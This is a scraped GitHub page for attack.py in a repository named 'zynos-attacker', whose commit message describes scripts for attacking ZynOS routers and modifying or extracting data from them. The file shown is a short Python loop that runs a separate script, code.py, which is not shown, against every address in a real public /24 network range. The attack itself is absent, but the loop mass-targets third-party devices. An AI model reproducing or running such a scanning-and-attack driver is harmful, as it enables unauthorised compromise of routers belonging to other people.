...
<html>
  <head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# githubog: http://ogp.me/ns/fb/githubog#">
    ...
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>zynos-attacker/attack.py at master · MrNasro/zynos-attacker · GitHub</title>
    ...
    <meta content="collector.githubapp.com" name="octolytics-host" /><meta content="collector-cdn.github.com" name="octolytics-script-host" /><meta content="github" name="octolytics-app-id" /><meta content="2A76A96F:2BC7:1184C0:52DCDF10" name="octolytics-dimension-request_id" />
...
<meta content="S4URgqgina+IS6zrmjgKSAP1zUy9jZKFVCizxZ6TJq4=" name="csrf-token" />
    ...
    <link href="https://github.global.ssl.fastly.net/assets/github2-3a909621ac79c89e7f414c6a6babc7f449d8ee93.css" media="all" rel="stylesheet" type="text/css" />
      ...
      <meta http-equiv="x-pjax-version" content="5fe7ec139c1bfc53297d312484aaf0e3">
        ...
        <link data-pjax-transient rel='permalink' href='/MrNasro/zynos-attacker/blob/6b4c90c6de4ae23adb95365e07205d07fb92a765/attack.py'>
  ...
  <div class="container clearfix">
    ...
    <div class="header-actions">
      ...
      <a class="button signin" href="/login?return_to=%2FMrNasro%2Fzynos-attacker%2Fblob%2Fmaster%2Fattack.py">Sign in</a>
    </div>
...
<!-- blob contrib key: blob_contributors:v21:a5ac054aeb57518f7eb77551fbb5ec5d -->
...
<div class="select-menu js-menu-container js-select-menu" >
      ...
      <div class="select-menu-list select-menu-tab-bucket js-select-menu-tab-bucket" data-tab-filter="branches">
        ...
        <div data-filterable-for="context-commitish-filter-field" data-filterable-type="substring">
            ...
            <div class="select-menu-item js-navigation-item selected">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/MrNasro/zynos-attacker/blob/master/attack.py"
                 data-name="master"
                 data-skip-pjax="true"
                 rel="nofollow"
  ...
  <div class="commit file-history-tease">
    <img class="main-avatar" height="24" src="https://1.gravatar.com/avatar/0ce9f33dd05bc8ea40224445d0af2833?d=https%3A%2F%2Fidenticons.github.com%2F391e6d0b086b9e565aedc5c1342f797f.png&amp;r=x&amp;s=140" width="24" />
    <span class="author"><a href="/MrNasro" rel="author">MrNasro</a></span>
    <time class="js-relative-date" datetime="2014-01-11T07:43:01-08:00" title="2014-01-11 07:43:01">January 11, 2014</time>
    <div class="commit-title">
        <a href="/MrNasro/zynos-attacker/commit/54d4e44f4fc22e5793a1b0ea95e14371b07ae59a" class="message" data-pjax="true" title="Attacking ZynOS routers.

With this scripts you can attack ZynOS routers and modify/extract
    ...
    <div id="blob_contributors_box" style="display:none">
      ...
      <ul class="facebox-user-list">
          <li class="facebox-user-list-item">
            <img height="24" src="https://1.gravatar.com/avatar/0ce9f33dd05bc8ea40224445d0af2833?d=https%3A%2F%2Fidenticons.github.com%2F391e6d0b086b9e565aedc5c1342f797f.png&amp;r=x&amp;s=140" width="24" />
    ...
    <div class="meta">
      ...
      <div class="actions">
        <div class="button-group">
          ...
          <a href="/MrNasro/zynos-attacker/raw/master/attack.py" class="button minibutton " id="raw-url">Raw</a>
            <a href="/MrNasro/zynos-attacker/blame/master/attack.py" class="button minibutton ">Blame</a>
          <a href="/MrNasro/zynos-attacker/commits/master/attack.py" class="button minibutton " rel="nofollow">History</a>
        </div><!-- /.button-group -->
...
<span id="L4" rel="#L4">4</span>
            ...
            <td class="blob-line-code">
                    <div class="code-body highlight"><pre><div class='line' id='LC1'><span class="kn">from</span> <span class="nn">netaddr</span> <span class="kn">import</span> <span class="n">IPNetwork</span></div><div class='line' id='LC2'><span class="kn">import</span> <span class="nn">os</span></div><div class='line' id='LC3'><span class="k">for</span> <span class="n">ip</span> <span class="ow">in</span> <span class="n">IPNetwork</span> <span class="p">(</span><span class="s">&#39;41.108.48.1/24&#39;</span><span class="p">):</span></div><div class='line' id='LC4'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;python code.py &quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span></div></pre></div>
            </td>
          </tr>
        </table>
  </div>
...
<div id="jump-to-line" style="display:none">
  ...
  <div class="site-footer">
    ...
    <ul class="site-footer-links">
      <li>&copy; 2014 <span title="0.02235s from github-fe129-cp1-prd.iad.github.net">GitHub</span>, Inc.</li>
